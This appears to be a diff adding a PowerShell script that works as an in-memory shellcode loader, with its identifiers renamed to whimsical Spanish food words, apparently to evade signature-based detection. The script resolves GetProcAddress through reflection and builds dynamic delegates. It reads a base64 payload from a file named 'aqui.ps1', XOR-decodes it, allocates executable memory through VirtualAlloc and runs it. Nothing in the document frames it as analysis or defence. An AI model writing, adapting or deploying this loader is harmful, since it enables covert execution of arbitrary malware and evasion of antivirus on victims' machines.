@@ -1,0 +1,37 @@
+Set-StrictMode -Version 2
+
+function func_chorizo_fantasma {
+	Param ($patata_caliente, $tortilla_magica)		
+	$churro_volador = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$gamba_parlante = $churro_volador.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $gamba_parlante.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($churro_volador.GetMethod('GetModuleHandle')).Invoke($null, @($patata_caliente)))), $tortilla_magica))
+}
+
+function func_donuts_invisibles {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $mochila_espacial,
+		[Parameter(Position = 1)] [Type] $queso_fantasia = [Void]
+	)
+
+	$gato_saltarin = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('ModuloMemoria', $false).DefineType('TipoDelegado', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$gato_saltarin.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mochila_espacial).SetImplementationFlags('Runtime, Managed')
+	$gato_saltarin.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $queso_fantasia, $mochila_espacial).SetImplementationFlags('Runtime, Managed')
+
+	return $gato_saltarin.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+	# Leer contenido del archivo 'aqui.ps1'
+	[Byte[]]$tigre_dorado = [System.Convert]::FromBase64String((Get-Content -Path "aqui.ps1"))
+
+	for ($albondiga = 0; $albondiga -lt $tigre_dorado.Count; $albondiga++) {
+		$tigre_dorado[$albondiga] = $tigre_dorado[$albondiga] -bxor 35
+	}
+
+	$pelusa_magica = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_chorizo_fantasma kernel32.dll VirtualAlloc), (func_donuts_invisibles @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$lechuza_invisible = $pelusa_magica.Invoke([IntPtr]::Zero, $tigre_dorado.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($tigre_dorado, 0, $lechuza_invisible, $tigre_dorado.length)
+
+	$dragones_bailarines = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lechuza_invisible, (func_donuts_invisibles @([IntPtr]) ([Void])))
+	$dragones_bailarines.Invoke([IntPtr]::Zero)
+}
